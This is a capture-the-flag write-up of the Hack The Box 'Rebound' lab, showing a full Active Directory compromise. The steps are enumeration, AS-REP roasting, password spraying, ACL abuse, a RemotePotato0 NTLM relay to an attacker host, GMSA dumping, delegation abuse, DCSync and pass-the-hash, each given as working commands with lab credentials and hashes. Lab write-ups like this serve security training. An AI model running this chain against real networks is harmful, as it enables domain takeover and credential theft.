---
title: HTB Rebound Writeup
author: Elus1nist
layout: post
date: 12 January 2023
imagesrc: https://labs.hackthebox.com/storage/avatars/2ad5dcb2fb97e40f5e88a0d6fc569bdd.png
---
Welcome! This is my writeup of the new Season 3 Insane machine from HTB, Rebound. 

---
---
## Enumerating Services and Open Ports


So to start, as usual we run an nmap TCP port scan:

```
nmap -sC -sV -oN initial_scan 10.10.11.231
```
This gives us the scan results of:

```
Nmap scan report for 10.10.11.231
Host is up (0.47s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-31 22:44:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2023-10-31T22:45:28+00:00; +6h59m55s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-31T22:45:27+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-31T22:45:28+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2023-10-31T22:45:27+00:00; +6h59m55s from scanner time.
```

We can see a Domain Controller with LDAP, Kerberos and SMB. Interestringly there is no web server so this is guarenteed to be Active Directory, LETS GO!

Firstly we can add the domain `rebound.htb` and the DC `dc01.rebound.htb` to our `/etc/hosts` file

---
---
## Gathering usernames with SMB

In order to proceed with RID bruteforcing we first need to make sure we have access to the `IPC$` share with SMB guest login

We can confirm with:
```sh
crackmapexec smb 10.10.222.122 -u 'guest' -p '' --shares
```

Now that we have READ access of SMB we can perform RID bruteforce and gain usernames:
```sh
crackmapexec smb 10.10.222.122 -u 'guest' -p '' --rid-brute 10000
```

This gives us the following usernames:
```
rebound\Administrator
rebound\Guest
rebound\krbtgt
rebound\DC01$
rebound\ppaul
rebound\llune
rebound\fflock
rebound\jjones
rebound\mmalone
rebound\nnoon
rebound\ldap_monitor
rebound\oorend
rebound\winrm_svc
rebound\batch_runner
rebound\tbrady
rebound\delegator$
```

---
---
## Kerberoasting for user tickets

Now that we have a list of usernames one of the first things we can try is to see is any of the users have Kerberos PreAuth disabled - AS-REP roasting:

```sh
GetNPUsers.py rebound.htb/ -dc-ip 10.10.11.231 -no-pass -usersfile enumerated_usernames
```

This gives us a few hashes, the following users:

1) jjones
2) delegator (machine account)
3) ldap_monitor

Of the three accounts, we can crack the password of ldap_monitor using hashcat revealing the following credentials:
`ldap_monitor : 1GR8t@$$4u`

We can also perform a password spray and see credentials `oorend : 1GR8t@$$4u`

Once we have access to the two users, we run bloodhound to gain insight into the AD Environment

---
---
## Bloodhound Enumeration

We can run bloodhound using the credentials for ldap_monitor. This shows us the following path from the `SERVICEMGMT` group to the `winrm_svc` user, who can PS Remote into the Domain Controller.

<img src="{{- 'writeup_images/Rebound/Service_MGMT-To-DC.jpg' | relative_url}}" >

Doing some manual enumeration of the AD Environment using PowerView we can see an ACL for the `SERVICEMGMT` group for the `oorend` user:

<img src="{{- 'writeup_images/Rebound/ACL_Check.jpg' | relative_url}}">

---
---
## Bloodhound Exploitation

### <u> Step 1: Add user oorend to SERVICEMGMT group </u>
Add user oorend to the `SERVICEMGMT` group, this time I tried out a tool that was new to me [BloodyAD](https://github.com/CravateRouge/bloodyAD).

According to the documentation we can use user passwd authentication to acomplish this:
```sh
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember 'CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB' "CN=oorend,CN=Users,DC=rebound,DC=htb"
```

### <u> Step 2: SERVICEMGMT -> winrm_svc </u>
Now that we are a member of this group, we have `Generic All` privileges over the `SERVICE USERS` group (Of which `winrm_svc` is a member).

As suggested by bloodhound, we can give the user `oorend` ResetPassword privileges over the `SERVICE USERS` group and the change the winrm_svc users password

To do this we will use the dacledit script with kerberos authentication.

1) Retrive oorend users ticket:
    ```sh
    python3 getTGT.py rebound.htb/oorend:'1GR8t@$$4u'
    export KRB5CCNAME=oorend.ccache
    ```
2) Add ACL for ResetPassword:
    ```sh
    python3 dacledit.py rebound.htb/oorend:'1GR8t@$$4u' -dc-ip 10.10.11.231 -k -use-ldaps -principal "oorend" -action write -rights ResetPassword -target-dn "OU=SERVICE USERS,DC=REBOUND,DC=HTB" -debug -inheritance
    ```
3) Reset winrm_svc password as oorend user:
    ```sh
    net rpc password winrm_svc -U 'rebound.htb/oorend%1GR8t@$$4u' -S rebound.htb
    ```

### <u> Step 3: Login as winrm_svc user for <i>USER.TXT</i></u>

We can now login using winrm to obtain the user flag:
```
evil-winrm -u winrm_svc -i 10.10.11.231
```

---
---
## Privilege Escalation

To enumerate the machine, we can run winPEAS. This shows us that the Session ID of 1 is owned by the user `tbrady`.
When this is the case and when we have the Session ID of 0, we can use `RemotePotato0` exploit to dump the NTLM hash of the user in SESSION 1.

Start the following listener with relay on attack box:
```sh
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 && sudo ntlmrelayx.py -t ldap://10.10.11.231 --no-wcf-server --escalate-user winrm_svc
```

Trigger RemotePotato attack from target machine:
```sh
.\RemotePotato0.exe -m 2 -r 10.10.16.4 -x 10.10.16.4 -p 9999 -s 1
```

This gives us the NTLMv2 hash of user `tbrady` on our attack box as follows:
```
NTLMv2 Client	: DC01
NTLMv2 Username	: rebound\tbrady
NTLMv2 Hash	: tbrady::rebound:cd376f04d9b56320:6ba1f7ea846dd8318569123d9359bee0:0101000000000000dd71fe89f4e4d9012bc3e898c11b79dd0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800dd71fe89f4e4d90106000400060000000800300030000000000000000100000000200000fb339e7ac3018ce371fcef4765ae238ad6560f4c951c682e798c61f1b74796be0a00100000000000000000000000000000000000090000000000000000000000
```

Cracking this hash with hashcat we gain credentials `tbrady : 543BOMBOMBUNmanda`

---
---
## Privilege Escalation: From tbrady -> delegator$

We can see from the bloodhound data that the user `tbrady` has `ReadGMSAPassword` privilege over the Delegator machine account:

```sh
crackmapexec ldap dc01.rebound.htb -u tbrady -p '543BOMBOMBUNmanda' -k --gmsa
```
Dumps NTLM hash for `delegator$`:
```sh
SMB         dc01.rebound.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        dc01.rebound.htb 636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda
LDAP        dc01.rebound.htb 636    DC01             [*] Getting GMSA Passwords
LDAP        dc01.rebound.htb 636    DC01             Account: delegator$           NTLM: 9b0ccb7d34c670b2a9c81c45bc8befc3
```

---
---
## Privilege Escalation: From delegator$ -> dc01$

As we can see from bloodhound, the `delegator$` machine user is allowed to delegate to http://dc01.rebound.htb

### <u> Step 1: Get Ticket as delegator$ machine user</u>

```sh
getTGT.py 'rebound.htb/delegator$@dc01.rebound.htb' -hashes :9b0ccb7d34c670b2a9c81c45bc8befc3
export KRB5CCNAME=./delegator\$@dc01.rebound.htb.ccache
```

### <u> Step 2: Use rbcd.py to delegate from ldap_monitor giving them the ability to impersonate service tickets </u>

Detailed [here](https://wadcoms.github.io/wadcoms/Impacket-RBCD/)

```sh
rbcd.py -k -no-pass 'rebound.htb/delegator$' -delegate-to 'delegator$' -use-ldaps -debug -action write -delegate-from ldap_monitor

getTGT.py rebound.htb/ldap_monitor:'1GR8t@$$4u'
export KRB5CCNAME=ldap_monitor.ccache
```

### <u> Step 3: With new privs impoersonate dc01$ machine account</u>

```sh
getST.py -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass
export KRB5CCNAME=./dc01\$.ccache
```

### <u> Step 4: DCSync Attack on domain controller</u>

```sh
secretsdump.py -no-pass -k dc01.rebound.htb -just-dc-ntlm
```

---
---
## PrivEsc to admin with Administrator Hash for <i>ROOT.TXT</i>

```sh
psexec.py 'rebound/Administrator'@dc01.rebound.htb -hashes '176be138594933bb67db3b2572fc91b8:176be138594933bb67db3b2572fc91b8'
```